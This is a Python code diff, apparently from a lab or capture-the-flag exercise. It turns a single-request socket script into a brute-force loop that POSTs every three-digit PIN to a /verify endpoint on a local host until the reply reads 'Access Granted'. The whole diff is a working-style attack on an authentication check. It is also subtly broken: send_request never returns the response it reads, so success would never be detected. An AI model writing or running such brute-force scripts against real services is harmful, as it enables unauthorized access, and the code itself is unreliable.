@@ -3,33 +3,47 @@ import socket
 HOST = '192.168.1.10'
 PORT = 8888
 
-pin = 132
+def create_request(pin):
+    pin_str = f"{pin:03d}"
+    body = f"magicNumber={pin_str}"
+    headers = (
+        "POST /verify HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+    )
+    return headers + body, pin_str
 
-# Create the request
-pin_str = f"{pin:03d}"
-body = f"magicNumber={pin_str}"
-headers = (
-    "POST /verify HTTP/1.1\r\n"
-    f"Host: {HOST}:{PORT}\r\n"
-    "Content-Type: application/x-www-form-urlencoded\r\n"
-    f"Content-Length: {len(body)}\r\n"
-    "Connection: close\r\n"
-    "\r\n"
-)
-request = headers + body
+def send_request(request):
+    try:
+        sock = socket.create_connection((HOST, PORT))
+        sock.sendall(request.encode())
+        response = b""
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+        sock.close()
+    except:
+        return None
 
-# Send the request
-sock = socket.create_connection((HOST, PORT))
-sock.sendall(request.encode())
+def main():
+    for pin in range(1000):
+        request, pin_str = create_request(pin)
+        response = send_request(request)
+        if response:
+            decoded = response.decode(errors="ignore")
+            if "Access Granted" in decoded:
+                print(f"SUCCESS! PIN: {pin_str}")
+                print(decoded)
+                break
+            else:
+                print(f"Trying PIN {pin_str}")
+        else:
+            print(f"No response for PIN {pin_str}")
 
-# Receive the response
-response = b""
-while True:
-    chunk = sock.recv(4096)
-    if not chunk:
-        break
-    response += chunk
-sock.close()
-
-# Decode and print the server response
-print(response.decode(errors="ignore"))
+if __name__ == "__main__":
+    main()
